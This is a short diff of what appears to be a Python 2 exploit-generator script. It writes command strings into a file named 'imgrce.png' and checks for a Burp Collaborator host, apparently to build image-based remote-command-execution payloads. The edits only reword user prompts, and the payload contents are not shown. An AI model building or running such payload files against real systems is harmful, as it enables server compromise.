@@ -32,14 +32,14 @@ def check():
 		print("-"*20)
 		img.write(command_1)
 		img.close()
-		out = (raw_input("[*] You want to exit y/n> "))
+		out = (raw_input("[*] Do you want to exit y/n> "))
 		if out == "y":
 			print("\nThanks")
 			exit()
 		elif out == "n":
 			return()
 		else:
-			print("[*] Please enter yes or no.")
+			print("[*] Please select yes or no.")
 		
 def system_file():
 	with open("imgrce.png","w") as img:
@@ -48,14 +48,14 @@ def system_file():
 		print("-"*20)
 		img.write(command_2)
 		img.close()
-		out = (raw_input("[*] You want to exit y/n> "))
+		out = (raw_input("[*] Do you want to exit y/n> "))
 		if out == "y":
 			print("\nThanks")
 			exit()
 		elif out == "n":
 			return()
 		else:
-			print("[*] Please enter yes or no.")
+			print("[*] Please select yes or no.")
 		
 
 if ".burpcollaborator.net" in Collaborator:
